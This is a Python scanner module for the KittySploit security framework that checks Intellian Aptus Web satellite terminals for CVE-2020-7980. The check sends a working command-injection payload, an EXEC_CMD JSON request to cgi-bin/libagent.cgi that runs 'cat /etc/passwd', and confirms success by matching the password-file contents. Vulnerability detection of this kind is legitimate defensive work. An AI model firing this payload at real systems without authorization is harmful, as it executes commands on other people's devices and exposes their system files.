#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Intellian Aptus Web 1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Satellian Intellian Aptus Web <= 1.24 - Remote Command Execution Detection',
        'description': 'Intellian Aptus Web 1.24 allows remote attackers to execute arbitrary OS commands via the Q field within JSON data to the cgi-bin/libagent.cgi URI. NOTE: a valid sid cookie for a login to the intellian default account might be needed.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve2020', 'cve', 'intellian', 'aptus', 'packetstorm', 'satellian', 'rce', 'intelliantech', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2020-7980',
            'https://sku11army.blogspot.com/2020/01/intellian-aptus-web-rce-intellian.html',
            'https://github.com/Xh4H/Satellian-CVE-2020-7980',
            'http://packetstormsecurity.com/files/156143/Satellian-1.12-Remote-Code-Execution.html',
            'https://github.com/0xT11/CVE-POC',
        ],
        'cve': 'CVE-2020-7980',
    }

    def run(self):
        path = '/cgi-bin/libagent.cgi?type=J'
        r = self.http_request(method='POST', path=path, allow_redirects=True, headers={'Content-Type': 'application/json', 'Cookie': 'ctr_t=0; sid=123456789'}, data='{"O_": "A", "F_": "EXEC_CMD", "S_": 123456789, "P1_": {"Q": "cat /etc/passwd", "F": "EXEC_CMD"}, "V_": 1}\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:[x*]:0:0',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='critical', reason='Satellian Intellian Aptus Web <= 1.24 - Remote Command Execution detected', path=path)
            return True
        return False

